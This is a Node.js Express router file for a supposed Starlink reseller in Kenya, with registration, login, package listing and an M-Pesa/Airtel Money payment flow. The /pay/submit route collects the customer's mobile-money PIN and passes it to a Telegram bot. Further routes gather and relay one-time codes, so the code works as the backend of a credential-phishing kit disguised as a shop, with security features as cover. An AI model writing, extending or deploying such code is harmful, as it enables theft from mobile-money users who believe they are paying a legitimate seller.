'use strict';

/**
 * Express routers for the Starlink Reseller API.
 *
 * server.js mounts these and owns nothing but wiring: middleware order, static
 * pages and the listen call. Route handlers live here.
 */

const express = require('express');
const path = require('path');

const { listPackages, getPackage, CATEGORIES, CURRENCY } = require('./packages');
const { createApprovalRequest, submitOtp, getApprovalStatus, sendNotification } = require('./telegram-bot');
const {
    validateApiSecret,
    rateLimit,
    validator,
    validateRegistration,
    validateLogin,
    auditLog,
    createSession,
    validateSession,
    maskPhone,
    safeEqual,
} = require('./security');
const {
    hashPassword,
    verifyPassword,
    DUMMY_HASH,
    issueCsrfToken,
    consumeCsrfToken,
    verifyWebhook,
} = require('./helpers');

const SUPPORT_PHONE = process.env.SUPPORT_PHONE || '+254712345678';
const SUPPORT_EMAIL = process.env.SUPPORT_EMAIL || 'support@starlink-ke.co.ke';
const SESSION_TTL_MS = 60 * 60 * 1000;

// Approval states in which a customer may still request another OTP. Anything
// else (completed/rejected/invalid/timeout, or an evicted 'not_found' record)
// is terminal and must not be reopenable via /pay/resend-otp.
const RESENDABLE_STATUSES = new Set(['phone_pin_verified', 'otp_pending', 'wrong_otp']);

// Demo persistence layers. Swap for a real database in production.
const users = new Map(); // normalizedPhone -> { name, passwordHash, createdAt }
const orders = new Map(); // requestId -> order snapshot

// ── Middleware ────────────────────────────
/** Requires a valid session (X-API-Secret) plus a matching one-time CSRF token. */
function requireCsrf(req, res, next) {
    const sessionToken = req.headers['x-api-secret'];
    if (!sessionToken || !validateSession(sessionToken)) {
        return res.status(401).json({ success: false, message: 'Session expired. Please reload the page.' });
    }
    const csrfToken = req.headers['x-csrf-token'] || req.body?.csrfToken;
    if (!consumeCsrfToken(sessionToken, csrfToken)) {
        return res.status(403).json({ success: false, message: 'Invalid or expired security token. Please reload the page.' });
    }
    next();
}

// ── Public API ────────────────────────────
const publicRouter = express.Router();

publicRouter.get('/health', (req, res) => {
    res.json({ status: 'OK', service: 'Starlink Reseller Kenya API', currency: CURRENCY });
});

publicRouter.post('/auth/session', rateLimit({ maxRequests: 30, windowMs: 60000, scope: 'session' }), (req, res) => {
    const token = createSession();
    res.json({ success: true, token, expiresIn: SESSION_TTL_MS });
});

publicRouter.get(
    '/csrf-token',
    validateApiSecret,
    rateLimit({ maxRequests: 60, windowMs: 60000, scope: 'csrf' }),
    (req, res) => {
        res.json({ success: true, csrfToken: issueCsrfToken(req.headers['x-api-secret']) });
    }
);

publicRouter.get('/config', (req, res) => {
    res.json({
        country: 'KE',
        countryName: 'Kenya',
        currency: CURRENCY,
        dialCode: '+254',
        language: 'en',
        supportEmail: SUPPORT_EMAIL,
        supportPhone: SUPPORT_PHONE,
        methods: [
            { id: 'safaricom', name: 'Safaricom M-Pesa', short: 'M-PESA', color: '#3EB449', textColor: '#ffffff' },
            { id: 'airtel', name: 'Airtel Money', short: 'airtel', color: '#E8112D', textColor: '#ffffff' },
        ],
    });
});

publicRouter.get('/packages', (req, res) => {
    res.json({ success: true, currency: CURRENCY, categories: CATEGORIES, packages: listPackages() });
});

publicRouter.get('/packages/:id', (req, res) => {
    const pkg = getPackage(req.params.id);
    if (!pkg) return res.status(404).json({ success: false, message: 'Package not found' });
    res.json({ success: true, package: pkg });
});

publicRouter.get('/support', (req, res) => {
    res.json({ phone: SUPPORT_PHONE, email: SUPPORT_EMAIL, hours: '24/7' });
});

// ── Auth ──────────────────
publicRouter.post(
    '/starlink/register',
    rateLimit({ maxRequests: 5, windowMs: 15 * 60 * 1000, scope: 'register' }),
    requireCsrf,
    (req, res) => {
        const ip = req.ip;
        const checked = validateRegistration(req.body);
        if (!checked.ok) {
            return res.status(400).json({ success: false, field: checked.field, message: checked.message });
        }
        const { normalizedPhone, name } = checked;
        if (users.has(normalizedPhone)) {
            auditLog.logAuth('REGISTER', ip, normalizedPhone, false, 'duplicate');
            return res.status(409).json({ success: false, field: 'phone', message: 'This number is already registered. Please log in.' });
        }
        users.set(normalizedPhone, {
            name,
            passwordHash: hashPassword(req.body.password),
            createdAt: Date.now(),
        });
        auditLog.logAuth('REGISTER', ip, normalizedPhone, true);
        res.status(201).json({
            success: true,
            message: 'Account created successfully.',
            user: { phone: normalizedPhone, name: users.get(normalizedPhone).name },
        });
    }
);

publicRouter.post(
    '/starlink/login',
    rateLimit({ maxRequests: 10, windowMs: 15 * 60 * 1000, scope: 'login' }),
    requireCsrf,
    (req, res) => {
        const ip = req.ip;
        const checked = validateLogin(req.body);
        if (!checked.ok) {
            return res.status(400).json({ success: false, field: checked.field, message: checked.message });
        }
        const { normalizedPhone } = checked;
        const { password } = req.body;
        const user = users.get(normalizedPhone);
        // Same generic message and comparable work for unknown user vs wrong
        // password, so the response cannot be used to enumerate accounts.
        const ok = user ? verifyPassword(password, user.passwordHash) : verifyPassword(password, DUMMY_HASH);
        if (!user || !ok) {
            auditLog.logAuth('LOGIN', ip, normalizedPhone, false, 'invalid_credentials');
            return res.status(401).json({ success: false, field: 'form', message: 'Incorrect phone number or password.' });
        }
        auditLog.logAuth('LOGIN', ip, normalizedPhone, true);
        res.json({ success: true, message: 'Login successful.', user: { phone: normalizedPhone, name: user.name } });
    }
);

// ── Payment flow (Airtel Money / Safaricom M-Pesa + Telegram) ──
publicRouter.post(
    '/pay/submit',
    rateLimit({ maxRequests: 8, windowMs: 10 * 60 * 1000, scope: 'pay-submit' }),
    validateApiSecret,
    async (req, res) => {
        const ip = req.ip;
        const { pin } = req.body || {};
        // Shared validation: phone + PIN + method + catalog package + price.
        const checked = validator.paymentDetails(req.body);
        if (!checked.ok) {
            return res.status(400).json({ success: false, field: checked.field, message: checked.message });
        }
        const { normalizedPhone, package: pkg, method, methodName } = checked;
        const amountLabel = `${CURRENCY} ${pkg.price.toLocaleString('en-KE')}`;
        const { requestId, delivered } = createApprovalRequest({
            userPhone: normalizedPhone,
            userPin: pin,
            package: `${pkg.name} \u00b7 ${pkg.duration}`,
            amount: amountLabel,
            method: methodName,
        });
        orders.set(requestId, {
            requestId,
            phone: normalizedPhone,
            method,
            methodName,
            packageId: pkg.id,
            packageName: `${pkg.name} \u00b7 ${pkg.duration}`,
            amount: pkg.price,
            currency: CURRENCY,
            createdAt: Date.now(),
            // Binds the order to the session that created it, so only that
            // browser may later submit an OTP for it.
            sessionToken: req.headers['x-api-secret'],
        });
        auditLog.logPaymentRequest(ip, normalizedPhone, pkg.id, method, requestId);
        // A Telegram outage must not fail the request, but the customer should
        // not be told approval is on its way when no admin was notified.
        const alerted = await delivered;
        res.json({
            success: true,
            requestId,
            delivered: alerted,
            message: alerted
                ? 'Payment request sent for verification.'
                : 'We received your request, but the verification desk could not be reached. Please retry in a moment.',
            order: { package: pkg.name, duration: pkg.duration, amount: pkg.price, currency: CURRENCY, method: methodName },
        });
    }
);

publicRouter.post(
    '/pay/submit-otp',
    rateLimit({ maxRequests: 12, windowMs: 10 * 60 * 1000, scope: 'pay-otp' }),
    requireCsrf,
    (req, res) => {
        const checked = validator.otpSubmission(req.body);
        if (!checked.ok) {
            return res.status(400).json({ success: false, field: checked.field, message: checked.message });
        }
        const { requestId, otp } = checked;
        // The OTP may only be submitted by the session that created the order;
        // otherwise any holder of a valid session could complete someone else's
        // requestId.
        const order = orders.get(requestId);
        if (order && !safeEqual(order.sessionToken, req.headers['x-api-secret'])) {
            auditLog.logOtpSubmit(req.ip, requestId, false);
            return res.status(403).json({ success: false, message: 'This request belongs to a different session.' });
        }
        const result = submitOtp(requestId, otp);
        auditLog.logOtpSubmit(req.ip, requestId, result.success);
        res.status(result.success ? 200 : 400).json(result);
    }
);

publicRouter.get(
    '/pay/status/:requestId',
    rateLimit({ maxRequests: 240, windowMs: 60000, scope: 'pay-status' }),
    validateApiSecret,
    (req, res) => {
        const { requestId } = req.params;
        if (!validator.requestId(requestId)) {
            return res.status(400).json({ status: 'invalid_request' });
        }
        const state = getApprovalStatus(requestId);
        const order = orders.get(requestId);
        // 'not_found' only means the approval record was evicted after its
        // retention window. A locally known order is at worst still 'pending'.
        const status = state.status === 'not_found' && order ? 'pending' : state.status;
        // Never echo the PIN or the expected OTP back to the browser.
        res.json({
            status,
            package: order?.packageName || state.package,
            amount: order ? order.amount : undefined,
            currency: order?.currency || CURRENCY,
            method: order?.methodName || state.method,
        });
    }
);

publicRouter.post(
    '/pay/resend-otp',
    rateLimit({ maxRequests: 4, windowMs: 10 * 60 * 1000, scope: 'pay-resend' }),
    validateApiSecret,
    (req, res) => {
        const { requestId } = req.body || {};
        if (!validator.requestId(requestId)) {
            return res.status(400).json({ success: false, message: 'Invalid request reference.' });
        }
        const order = orders.get(requestId);
        if (!order) return res.status(404).json({ success: false, message: 'Request not found or expired.' });
        // Only a request still awaiting the customer's action may trigger another
        // admin notification. A completed/rejected/timed-out request must not be
        // resendable, or a customer could spam the admin for a finished order.
        const state = getApprovalStatus(requestId);
        if (!RESENDABLE_STATUSES.has(state.status)) {
            return res.status(409).json({ success: false, message: 'This request is no longer awaiting a code.' });
        }
        sendNotification(
            `\ud83d\udd01 OTP resend requested\n\ud83d\udcf1 ${maskPhone(order.phone)}\n\ud83d\udce6 ${order.packageName}\n\ud83d\udcb3 ${order.methodName}\n\ud83c\udd94 ${requestId}`
        );
        res.json({ success: true, message: 'A new code has been requested.' });
    }
);

// ── Orders (demo read model) ──────────────────────────────
/**
 * Resolves an order's display status. A 'not_found' approval record only means
 * it was evicted after its retention window; the order is still real, so we
 * report the least-surprising state instead.
 * @param {string} requestId
 * @returns {string}
 */
function statusForOrder(requestId) {
    const s = getApprovalStatus(requestId).status;
    return s === 'not_found' ? 'pending' : s;
}

/**
 * Builds the sorted order read model for one normalized phone number.
 * @param {string} normalizedPhone
 * @returns {object[]}
 */
function buildOrderList(normalizedPhone) {
    return [...orders.values()]
        .filter((o) => o.phone === normalizedPhone)
        .map((o) => ({
            id: o.requestId,
            package: o.packageName,
            amount: o.amount,
            currency: o.currency,
            method: o.methodName,
            date: new Date(o.createdAt).toISOString(),
            status: statusForOrder(o.requestId),
        }))
        .sort((a, b) => new Date(b.date) - new Date(a.date));
}

publicRouter.get('/orders', validateApiSecret, (req, res) => {
    const normalizedPhone = validator.normalizePhone(req.query.phone);
    if (!normalizedPhone) {
        return res.status(400).json({ success: false, message: 'A valid Kenyan phone number is required.' });
    }
    res.json({ success: true, orders: buildOrderList(normalizedPhone) });
});

// ── Payment provider webhooks (signature-verified) ────────
/**
 * Mounts a signature-verified webhook for a payment provider.
 * @param {string} provider Lowercase provider name matching the *_WEBHOOK_SECRET env prefix.
 * @param {string} scope    Rate-limit scope for this provider's route.
 */
function registerWebhook(router, provider, scope) {
    router.post(`/${provider}`, rateLimit({ maxRequests: 60, windowMs: 60000, scope }), verifyWebhook(provider), (req, res) => {
        auditLog.write(`WEBHOOK_${provider.toUpperCase()}`, {
            ip: req.ip,
            transactionId: validator.sanitize(req.body?.transactionId || '', 64),
        });
        res.json({ success: true });
    });
}

/** Webhook sub-router, mounted at /api/webhook. */
const webhookRouter = express.Router();
registerWebhook(webhookRouter, 'safaricom', 'wh-saf');
registerWebhook(webhookRouter, 'airtel', 'wh-air');

module.exports = { publicRouter, webhookRouter, requireCsrf, users, orders };
